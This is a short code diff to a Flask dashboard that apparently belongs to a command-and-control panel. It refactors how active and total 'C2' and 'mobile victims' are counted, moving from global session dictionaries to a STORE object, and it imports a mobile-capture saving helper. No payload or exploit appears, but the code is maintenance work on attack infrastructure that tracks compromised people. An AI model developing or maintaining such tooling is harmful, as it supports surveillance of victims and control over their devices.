@@ -7,7 +7,7 @@ from datetime import datetime, timedelta
 from functools import wraps
 from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
 from app.state import *  # noqa: F401,F403  -- P3
-from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
+from app.state import BASE_DIR, CONFIG, STORE, _decode_data_url, _save_mobile_capture
 import database as db
 
 import platform
@@ -209,8 +209,8 @@ def analytics_dashboard():
         session_count = len([f for f in os.listdir(sessions_dir) if f.endswith('_meta.json')]) if os.path.exists(sessions_dir) else 0
         
         # Count active C2 + mobile victims
-        active_c2 = sum(1 for s in C2_SESSIONS.values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
-        active_mobile = sum(1 for s in MOBILE_SESSIONS.values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
+        active_c2 = sum(1 for s in STORE.c2_all_sessions().values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
+        active_mobile = sum(1 for s in STORE.mobile_all_sessions().values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
         
         # Disk usage
         total_size = 0
@@ -236,11 +236,11 @@ def analytics_dashboard():
             },
             'victims': {
                 'c2_active': active_c2,
-                'c2_total': len(C2_SESSIONS),
+                'c2_total': len(STORE.c2_all_sessions()),
                 'mobile_active': active_mobile,
-                'mobile_total': len(MOBILE_SESSIONS),
+                'mobile_total': len(STORE.mobile_all_sessions()),
                 'total_active': active_c2 + active_mobile,
-                'total_all': len(C2_SESSIONS) + len(MOBILE_SESSIONS)
+                'total_all': len(STORE.c2_all_sessions()) + len(STORE.mobile_all_sessions())
             },
             'system': {
                 'uptime': int(uptime_seconds),
